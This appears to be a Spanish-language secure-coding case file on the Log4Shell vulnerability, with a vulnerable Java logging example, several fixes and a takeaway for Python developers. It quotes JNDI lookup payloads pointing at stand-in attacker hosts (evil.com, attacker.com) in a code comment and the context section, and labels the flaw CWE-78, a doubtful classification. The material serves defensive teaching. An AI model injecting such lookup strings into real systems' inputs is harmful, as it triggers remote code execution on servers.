# Case: Remote Code Execution via Log4Shell (CVE-2021-44228)

## CVE

CVE-2021-44228

## CWE asociado

CWE-78 (OS Command Injection via JNDI lookup)

## Descripción

Apache Log4j 2.x antes de 2.15.0 era vulnerable a RCE cuando procesaba mensajes de log que contenían lookup strings JNDI (`${jndi:ldap://...}`). Un atacante podía inyectar esta string en cualquier input que se logueara (headers HTTP, form fields, user agents) para ejecutar código remoto en el servidor.

## Código vulnerable

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class LoginController {
    private static final Logger logger = LogManager.getLogger();

    public void login(String username, String password) {
        // El username viene del request — si contiene ${jndi:ldap://evil.com/exploit}
        // Log4j resuelve el lookup y descarga/ejecuta código remoto
        logger.info("Login attempt for user: " + username);
    }
}
```

## Código corregido

```java
// Opción 1: Actualizar Log4j a 2.17.0+
// En pom.xml:
// <dependency>
//   <groupId>org.apache.logging.log4j</groupId>
//   <artifactId>log4j-core</artifactId>
//   <version>2.17.1</version>
// </dependency>

// Opción 2: Deshabilitar lookups (mitigación temporal)
// -Dlog4j2.formatMsgNoLookups=true

// Opción 3: Sanitizar input antes de loguear
logger.info("Login attempt for user: {}", 
    username.replaceAll("\\$\\{.*?\\}", "[REMOVED]"));
```

## Contexto

Log4Shell afectó a millones de aplicaciones Java. CVSS 10.0. El vector era trivial: enviar `${jndi:ldap://attacker.com/a}` en cualquier campo que se logueara (User-Agent header, email en formulario de login, chat messages). La lección para Python: nunca interpolar datos no confiables en strings que pasan por procesamiento adicional (logs, templates, queries).

## Referencia

- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- https://logging.apache.org/log4j/2.x/security.html
